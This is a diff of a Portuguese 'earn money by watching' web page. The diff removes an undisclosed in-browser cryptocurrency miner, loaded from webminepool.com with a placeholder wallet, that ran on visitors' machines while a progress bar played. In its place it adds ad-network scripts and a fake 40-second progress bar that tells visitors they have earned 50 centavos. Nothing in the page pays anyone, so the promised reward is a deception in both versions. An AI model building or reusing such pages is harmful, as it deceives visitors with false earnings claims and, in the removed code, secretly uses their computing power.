@@ -5,9 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ganhe Dinheiro Assistindo</title>
 
-    <!-- Adsterra ad code (exemplo) -->
-    <script type='text/javascript' src='https://www.profitabledisplaynetwork.com/a/display.js'></script>
-
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -39,42 +36,42 @@
 </head>
 <body>
 
-    <h1>Assista e Ganhe Dinheiro</h1>
+    <h1>Ganhe Dinheiro Assistindo!</h1>
 
-    <!-- Progress bar -->
+    <!-- Anúncio da Adsterra -->
+    <div style="text-align: center; margin-top: 20px;">
+        <script type="text/javascript">
+          atOptions = {
+            'key' : '60784ace5f47da1e661327c3f4a41023',
+            'format' : 'iframe',
+            'height' : 90,
+            'width' : 728,
+            'params' : {}
+          };
+        </script>
+        <script type="text/javascript" src="//www.highperformanceformat.com/60784ace5f47da1e661327c3f4a41023/invoke.js"></script>
+    </div>
+
+    <!-- Barra de Progresso -->
     <div id="progressBar">
         <div id="progressFill">0%</div>
     </div>
 
     <div id="status">Aguardando...</div>
 
-    <!-- Inicia mineração -->
-    <script src="https://webminepool.com/lib/base.js"></script>
     <script>
-        const miner = WMP.User("YOUR_WALLET_ADDRESS", "worker1");
-        miner.start();
-    </script>
-
-    <!-- Barra de progresso -->
-    <script>
-        let time = 0;
-        let duration = 40; // segundos
-
-        const fill = document.getElementById("progressFill");
-        const status = document.getElementById("status");
-
-        const timer = setInterval(() => {
-            time++;
-            let progress = Math.min((time / duration) * 100, 100);
-            fill.style.width = progress + "%";
-            fill.textContent = Math.floor(progress) + "%";
-
-            if (progress >= 100) {
-                clearInterval(timer);
-                status.textContent = "Você ganhou 0.50 centavos!";
-                miner.stop();
+        // Script para animar a barra de progresso
+        let width = 0;
+        let progress = setInterval(function() {
+            if (width >= 100) {
+                clearInterval(progress);
+                document.getElementById("status").innerText = "Pronto! Você ganhou 50 centavos!";
+            } else {
+                width++;
+                document.getElementById("progressFill").style.width = width + "%";
+                document.getElementById("progressFill").innerText = width + "%";
             }
-        }, 1000);
+        }, 400); // 400ms * 100 = 40 segundos
     </script>
 
 </body>
